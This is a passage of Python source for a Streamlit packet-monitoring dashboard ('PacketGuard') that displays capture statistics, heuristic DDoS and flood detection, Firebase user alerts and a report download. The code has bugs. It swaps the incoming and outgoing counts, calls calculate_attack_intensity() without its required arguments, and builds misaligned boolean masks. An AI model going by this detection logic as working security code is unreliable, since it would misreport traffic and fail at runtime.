                <div class="basic-info-value">{(data['Label'] == 'malicious').sum()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Incoming Packets</div>
                <div class="basic-info-value">{(data['Direction'] == 'Outgoing').sum()}</div>
            </div>
            <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Outgoing Packets</div>
                <div class="basic-info-value">{(data['Direction'] == 'Incoming').sum()}</div>
            </div>
             <hr>
            <div class="basic-info-row">
                <div class="basic-info-label">Packet Loss Percentage</div>
                <div class="basic-info-value">{detect_packet_loss(data):.2f}%</div>
            </div>
        </div>
        """,
        unsafe_allow_html=True
    )

    
    
    # Add distance between sections
    st.markdown("<br>", unsafe_allow_html=True)  # You can adjust the number of line breaks as needed

    # Display DataFrame with packets containing a malicious label
    malicious_packets = data[data['Label'] == 'malicious']
    if not malicious_packets.empty:
        st.warning("Packets with Malicious Label")
        st.table(malicious_packets)
    else:
        st.success("No malicious packets found.")

    # Add distance between sections
    st.markdown("<br>", unsafe_allow_html=True)

    # Display top 5 protocols, source addresses, and destination addresses
    st.header("Top 5 Protocols, Source Addresses, and Destination Addresses")
    
    # Relative CSS styling for tables
    st.markdown(
        """
        <style>
        .relative-table {
            margin: 1rem 0;
        }
        .relative-table th {
            background-color: #f0f0f0;
            padding: 0.5rem;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .relative-table td {
            padding: 0.5rem;
            border-bottom: 1px solid #ddd;
        }
        </style>
        """,
        unsafe_allow_html=True
    )

    st.subheader("Top 5 Protocols")
    top_protocols = data['Protocol'].value_counts().head(5).reset_index()
    top_protocols.columns = ['Protocol', 'Count']
    st.table(top_protocols.style.set_properties(**{'text-align': 'center'}).set_table_styles([{'selector': 'th', 'props': [('text-align', 'center')]}]))

    st.subheader("Top 5 Source Addresses")
    top_source_addresses = data['Source'].value_counts().head(5).reset_index()
    top_source_addresses.columns = ['Source Address', 'Count']
    st.table(top_source_addresses.style.set_properties(**{'text-align': 'center'}).set_table_styles([{'selector': 'th', 'props': [('text-align', 'center')]}]))

    st.subheader("Top 5 Destination Addresses")
    top_destination_addresses = data['Destination'].value_counts().head(5).reset_index()
    top_destination_addresses.columns = ['Destination Address', 'Count']
    st.table(top_destination_addresses.style.set_properties(**{'text-align': 'center'}).set_table_styles([{'selector': 'th', 'props': [('text-align', 'center')]}]))

    # Add distance between sections
    st.markdown("<br>", unsafe_allow_html=True)

# Define initial throttling parameters
initial_throttle_rate_limit = 100  # Initial number of packets allowed per second during throttling
throttle_duration = 60  # Duration of throttling in seconds

# Define a function to dynamically adjust throttling rate based on attack severity
def adjust_throttling_rate(attack_intensity):
    # Define mapping of attack intensity to throttling rate
    intensity_thresholds = {
        'low': 50,
        'medium': 100,
        'high': 200
    }

    # Determine the appropriate throttling rate based on attack intensity
    if attack_intensity < 0.3:
        return intensity_thresholds['low']
    elif 0.3 <= attack_intensity < 0.7:
        return intensity_thresholds['medium']
    else:
        return intensity_thresholds['high']

# Define a function to throttle packet flow
def throttle_packets(throttle_rate_limit):
    print(f"Throttling mechanism is applied. Limit: {throttle_rate_limit} packets/second.")
    # Throttle packet flow by delaying packet processing
    time.sleep(1 / throttle_rate_limit)  # Adjust sleep duration based on desired rate limit

def calculate_attack_intensity(max_packet_count, max_length_at_second, ddos_attacks_destination_count, ddos_attacks_length_count,
                                ddos_attacks_protocol_count, https_flood_detected, ssl_amplification_detected,
                                syn_flood_detected, udp_flood_detected, icmp_flood_detected):
    # Calculate attack intensity based on various factors
    # You may need to adjust these calculations based on the relative importance of each factor and your specific requirements

    # Calculate a weighted sum of detected counts and metrics
    intensity = (max_packet_count + max_length_at_second['Length'] + ddos_attacks_destination_count +
                 ddos_attacks_length_count + ddos_attacks_protocol_count +
                 int(https_flood_detected) + int(ssl_amplification_detected.any()) +
                 int(syn_flood_detected.any()) + int(udp_flood_detected.any()) + int(icmp_flood_detected.any())) / 10.0

    return intensity


def display_detected_attack_types(data):
    st.markdown(
        """
        <style>
        .highlight {
            background-color: #f0f0f0;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 20px;
        }
        .attack-header {
            color: #ff6347;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .attack-table {
            font-size: 14px;
            border-collapse: collapse;
        }
        .attack-table th {
            background-color: #f0f0f0;
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .attack-table td {
            padding: 8px;
            border-bottom: 1px solid #ddd;
        }
        .success-msg {
            color: #32CD32;
            font-size: 18px;
        }
        </style>
        """,
        unsafe_allow_html=True
    )

    attack_detected = False

    # Check for DDoS attacks based on high volume of packets from multiple sources to a single destination,
    # abnormal packet lengths, and specific protocols commonly used for DDoS attacks
    ddos_protocols = ['TCP', 'UDP', 'ICMP', 'SSL/TLS']  # Protocols commonly used for DDoS attacks

    # Set thresholds for DDoS attacks
    threshold_destination = 100
    threshold_length = 1000
    threshold_https_request = 200  # Threshold for detecting HTTPS flood
    threshold_ssl_amplification_ratio = 10 
    threshold_syn_count = 100  # Threshold for detecting SYN flood
    threshold_udp_count = 100  # Threshold for detecting UDP flood
    threshold_icmp_count = 100  # Threshold for detecting ICMP flood

    # Group data by 'Time' and calculate maximum packet count and maximum length for each second
    grouped_data = data.groupby('Time').agg({'Destination': 'count', 'Length': 'max'}).reset_index()

    # Count packets meeting each condition for DDoS attacks
    ddos_attacks_destination_count = (grouped_data['Destination'] > threshold_destination).sum()
    ddos_attacks_length_count = (grouped_data['Length'] > threshold_length).sum()
    ddos_attacks_protocol_count = data['Protocol'].isin(ddos_protocols).sum()

    # Find the maximum packet count and maximum length at a particular second obtained for DDoS attacks
    max_packet_count = grouped_data['Destination'].max()
    max_length_at_second = grouped_data.loc[grouped_data['Length'].idxmax()]

    # Additional checks for HTTPS flood and SSL-based amplification for DDoS attacks
    https_flood_detected = (data['Protocol'] == 'HTTPS').sum() > threshold_https_request
    ssl_amplification_detected = (data['Protocol'] == 'SSL/TLS') & (data['Length'] / grouped_data['Destination'] > threshold_ssl_amplification_ratio)
    # Additional checks for SYN flood, UDP flood, and ICMP flood for DDoS attacks
    syn_flood_detected = (data['Protocol'] == 'TCP') & (data['Flags'] == 'SYN') & (data['Destination'].value_counts() > threshold_syn_count)
    udp_flood_detected = (data['Protocol'] == 'UDP') & (data['Destination'].value_counts() > threshold_udp_count)
    icmp_flood_detected = (data['Protocol'] == 'ICMP') & (data['Destination'].value_counts() > threshold_icmp_count) 

    # Filter data for DDoS attacks based on the conditions
    ddos_attacks = data[
        (data['Destination'].value_counts() > threshold_destination) &
        (data['Length'] > threshold_length) &
        (data['Protocol'].isin(ddos_protocols)) &
        ((data['Protocol'] == 'HTTPS') | ssl_amplification_detected) &
        (syn_flood_detected | udp_flood_detected | icmp_flood_detected)
    ]


    # Display counts for each condition for DDoS attacks
    st.markdown("<div class='attack-header'>Counts of packets meeting specified criteria:</div>", unsafe_allow_html=True)
    st.write(f"Maximum Packet Count in a particular second: {max_packet_count}")
    st.write(f"Length > {threshold_length} at {max_length_at_second['Time']}: {max_length_at_second['Length']}")
    st.write(f"Destination count > {threshold_destination}: {ddos_attacks_destination_count}")
    st.write(f"Length > {threshold_length}: {ddos_attacks_length_count}")
    st.write(f"Protocol in {ddos_protocols}: {ddos_attacks_protocol_count}")
    st.write(f"HTTPS Flood Detected: {https_flood_detected}")
    st.write(f"SSL Amplification Detected: {ssl_amplification_detected.any()}")
    st.write(f"SYN Flood Detected: {syn_flood_detected.any()}")
    st.write(f"UDP Flood Detected: {udp_flood_detected.any()}")
    st.write(f"ICMP Flood Detected: {icmp_flood_detected.any()}")
    st.markdown("</div>", unsafe_allow_html=True)

    

    # If DDoS attacks detected, display details and alert registered users
    if not ddos_attacks.empty:
        attack_detected = True
        st.subheader("DDoS Attacks")
        st.table(ddos_attacks)
        
        # Detect DDoS attacks and alert registered users
        try:
            users_ref = db.reference('users', app=firebase_admin.get_app("network"))
            registered_users = users_ref.get()
        except Exception as e:
            st.error(f"Error occurred while fetching registered users: {e}")
        else:
            if registered_users:
                # Extract user tokens
                user_tokens = [user['token'] for user in registered_users.values() if 'token' in user]
                if user_tokens:
                    # Send alert to registered users
                    send_alert_to_users(registered_users.values(), "A DDoS attack has been detected!")
                else:
                    st.warning("No FCM tokens found for registered users.")
            else:
                st.warning("No registered users found.")
    else:
        st.success("No DDoS attacks detected.")

    # Implement throttling mechanism
    if attack_detected:
        # Calculate the attack intensity (you may need to define this based on your specific detection logic)
        attack_intensity = calculate_attack_intensity()  # Placeholder function, replace with your actual implementation
        # Adjust throttling rate based on attack intensity
        throttle_rate_limit = adjust_throttling_rate(attack_intensity)
        # Apply throttling logic
        throttle_packets(throttle_rate_limit)
    else:
        st.success("Throttling mechanism will be applied in case of DDoS attack detection.")



# Define conversion functions
def hours_to_seconds(hours):
    return int(hours * 3600)

def days_to_seconds(days):
    return int(days * 24 * 3600)

def months_to_seconds(months):
    return int(months * 30 * 24 * 3600)

def minutes_to_seconds(minutes):
    return int(minutes * 60)

def seconds_to_hms(seconds):
    return str(datetime.timedelta(seconds=seconds))

def main():
    global data

    info_container = st.empty()  # Create an empty container for app information and user guide

    # Function to hide the app information and user guide
    def hide_info():
        info_container.empty()  # Clear the content of the container

    # Web app information and user guide
    info_container.markdown(
        """
    <div style="background-color: #f8f9fa; border: #ced4da; border-radius: 10px; padding: 20px;">
        <h2 style="margin-bottom: 15px;">PacketGuard : Network Packet Monitor</h2>
        <p style="font-size: 16px; line-height: 1.6; margin-bottom: 20px;">This web application allows you to capture and classify packets, extract network information, detect malware packets and detect network attacks.</p>
        <h3 style="color: #007bff; font-size: 18px; margin-bottom: 10px;">Instructions:</h3>
        <ol style="font-size: 16px; line-height: 1.6; margin-left: 20px; margin-bottom: 20px;">
            <li>Register with your email and password on the sidebar.</li>
            <li>Choose packet capture options (Wi-Fi or Ethernet) and specify capture duration.</li>
            <li>Click on "Start Packet Capture" to begin capturing packets.</li>
            <li>Otherwise drop network packet data file for classification of past network captures.</li>
        </ol>
        <h3 style="color: #007bff; font-size: 18px; margin-bottom: 10px;">Additional Information:</h3>
        <ul style="font-size: 16px; line-height: 1.6; margin-left: 20px; margin-bottom: 20px;">
            <li><strong>Packet Classification:</strong> After packet capture, the application will analyze the captured data and classify packets based on various parameters.</li>
            <li><strong>Basic Network Information:</strong> The web app provides basic network information including total packets, unique protocols, top source and destination addresses, average packet size, most common payload, and statistics on malicious, incoming, and outgoing packets.</li>
            <li><strong>Visualization:</strong> The application provides visualizations to help you understand the packet data more effectively.</li>
            <li><strong>Attack Detection:</strong> The application also detects potential attacks based on the captured packet data.</li>
            <li><strong>Download Classification Report:</strong> You can download a classification report containing basic information about the captured packets.</li>
        </ul>
        <p style="font-size: 16px; line-height: 1.6;"><strong>Note:</strong> Make sure you have necessary permissions for packet capture.</p>
    </div>
    """
    , unsafe_allow_html=True
    )

    # Sidebar for user registration
    st.sidebar.title("User Registration")
    email_key = hash("email_input")  # Generate unique key for email input
    password_key = hash("password_input")  # Generate unique key for password input
    email = st.sidebar.text_input("Email", key=email_key)
    password = st.sidebar.text_input("Password", type="password", key=password_key)
    if st.sidebar.button("Register"):
        if email and password:
            save_user_data(email, password)
            st.sidebar.success("User registered successfully!")
        else:
            st.sidebar.error("Please provide both email and password.")

    # Main content for packet capture and classification
    st.sidebar.title("Packet Capture")
    st.sidebar.write("Choose Network Interface:")
    wifi_option = st.sidebar.checkbox("Wi-Fi")
    ethernet_option = st.sidebar.checkbox("Ethernet")

    # Initialize sniff duration variables
    sniff_duration_seconds = None
    sniff_duration_minutes = None
    sniff_duration_hours = None
    sniff_duration_days = None
    sniff_duration_months = None

    # Create a checkbox for the user to choose between different time units
    st.sidebar.write("Choose Duration for capturing packets:")
    use_seconds = st.sidebar.checkbox("Duration in Seconds")
    use_minutes = st.sidebar.checkbox("Duration in Minutes")
    use_hours = st.sidebar.checkbox("Duration in Hours")
    use_days = st.sidebar.checkbox("Duration in Days")
    use_months = st.sidebar.checkbox("Duration in Months")

    # If the user chooses to use hours
    if use_seconds:
        sniff_duration_seconds = st.sidebar.slider("Packet Sniffing Duration (seconds)", min_value=1, max_value=60, value=30)
        st.write(f"Capturing network packets for {sniff_duration_seconds} seconds")
    # If the user chooses to use minutes
    if use_minutes:
        sniff_duration_minutes = st.sidebar.slider("Packet Sniffing Duration (minutes)", min_value=1, max_value=60, value=30)
        st.write(f"Capturing network packets for {sniff_duration_minutes} minutes")
    # If the user chooses to use seconds
    if use_hours:
        sniff_duration_hours = st.sidebar.slider("Packet Sniffing Duration (hours)", min_value=1, max_value=24, value=12)
        st.write(f"Capturing network packets for {sniff_duration_hours} hours")
    # If the user chooses to use days
    if use_days:
        sniff_duration_days = st.sidebar.slider("Packet Sniffing Duration (days)", min_value=1, max_value=30, value=15)
        st.write(f"Capturing network packets for {sniff_duration_days} days")
    # If the user chooses to use months
    if use_months:
        sniff_duration_months = st.sidebar.slider("Packet Sniffing Duration (months)", min_value=1, max_value=12, value=6)
        st.write(f"Capturing network packets for {sniff_duration_months} months")

    # Convert sniff duration values to seconds
    total_sniff_duration_seconds = 0
    if sniff_duration_seconds is not None:
        total_sniff_duration_seconds += sniff_duration_seconds
    if sniff_duration_minutes is not None:
        total_sniff_duration_seconds += minutes_to_seconds(sniff_duration_minutes)
    if sniff_duration_hours is not None:
        total_sniff_duration_seconds += hours_to_seconds(sniff_duration_hours)
    if sniff_duration_days is not None:
        total_sniff_duration_seconds += days_to_seconds(sniff_duration_days)
    if sniff_duration_months is not None:
        total_sniff_duration_seconds += months_to_seconds(sniff_duration_months)

    data = None  # Initialize data variable

    if st.sidebar.button("Start Packet Capture"):
        hide_info()  # Hide the app information and user guide
        try:
            if wifi_option:
                capture_and_save_packets("Wi-Fi", total_sniff_duration_seconds, "network_packets.csv")
            if ethernet_option:
                capture_and_save_packets("Ethernet", total_sniff_duration_seconds, "network_packets.csv")

            data = pd.read_csv("network_packets.csv")

            if data is not None:  
                display_dashboard(data)

                 # Drop malicious packets and update DataFrame
                modified_data = disrupt_communication(data)

                # Display DataFrame without the dropped malicious packets
                st.success("Dropping Malicious packets from network interface")
                st.write("Dataframe after dropping malicious packets")
                st.table(modified_data)
                
                save_basic_info_to_firebase(email, data)


            images_dir = "images"  # Directory to save generated images
            results = visualize_distributions(data, images_dir)

            # Display saved images
            for image_name, image_path in results.items():
                st.image(image_path, caption=image_name)

            st.header("Attack Detection")

            # Display detected attack types
            display_detected_attack_types(data)

        except Exception as e:
            st.error(str(e))
            traceback.print_exc()

    st.sidebar.write("Upload previously captured network packets data here")
    uploaded_file = st.sidebar.file_uploader("", type=["csv"])
    if uploaded_file is not None:
        try:
            data = pd.read_csv(uploaded_file)
            data.to_csv("network_packets.csv", index=False)
            st.sidebar.success("CSV file uploaded and stored successfully.")
            if data is not None:  
                st.table(data)
                display_dashboard(data)
                save_basic_info_to_firebase(email, data)

            images_dir = "images"  # Directory to save generated images
            results = visualize_distributions(data, images_dir)

            # Display saved images
            for image_name, image_path in results.items():
                st.image(image_path, caption=image_name)

            st.header("Attack Detection")

            # Display detected attack types
            display_detected_attack_types(data)

        except Exception as e:
            st.error(str(e))
            traceback.print_exc()

    st.markdown(
        """
        <style>
        .download-link {
            display: inline-block;
            padding: 10px 20px;
            background-color: skyblue;
            color: white;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            font-size: 16px;
            margin: 4px 2px;
            transition-duration: 0.4s;
            cursor: pointer;
        }

        .download-link:hover {
            background-color: skyblue;
            text-decoration: none;
        }
        </style>
        """,
        unsafe_allow_html=True
    )

    # Add download button for basic information text file
    if data is not None:
        basic_info_text = ""
        basic_info_text += "Total Packets: {}\n".format(len(data))
        basic_info_text += "Unique Protocols: {}\n".format(data['Protocol'].nunique())
        basic_info_text += "Top 5 Protocols:\n"
        top_protocols = data['Protocol'].value_counts().head(5).reset_index()
        basic_info_text += top_protocols.to_string(index=False) + "\n\n"
        basic_info_text += "Unique Source Addresses: {}\n".format(data['Source'].nunique())
        basic_info_text += "Top 5 Source Addresses:\n"
        top_source_addresses = data['Source'].value_counts().head(5).reset_index()
        basic_info_text += top_source_addresses.to_string(index=False) + "\n\n"
        basic_info_text += "Unique Destination Addresses: {}\n".format(data['Destination'].nunique())
        basic_info_text += "Top 5 Destination Addresses:\n"
        top_destination_addresses = data['Destination'].value_counts().head(5).reset_index()
        basic_info_text += top_destination_addresses.to_string(index=False) + "\n\n"
        basic_info_text += "Average Packet Size: {:.2f} bytes\n".format(data['Length'].mean())
        basic_info_text += "Most Common Payload: {}\n".format(data['Payload'].value_counts().idxmax())
        basic_info_text += "Malicious Packets: {}\n".format((data['Label'] == 'malicious').sum())
        basic_info_text += "Incoming Packets: {}\n".format((data['Direction'] == 'Incoming').sum())
        basic_info_text += "Outgoing Packets: {}\n".format((data['Direction'] == 'Outgoing').sum())

        b64 = base64.b64encode(basic_info_text.encode()).decode()  # some strings <-> bytes conversions necessary here
        href = f'<a href="data:file/txt;base64,{b64}" class="download-link" download="classification_report.txt">Download Report</a>'
        st.markdown(href, unsafe_allow_html=True)

if __name__ == "__main__":
    main()
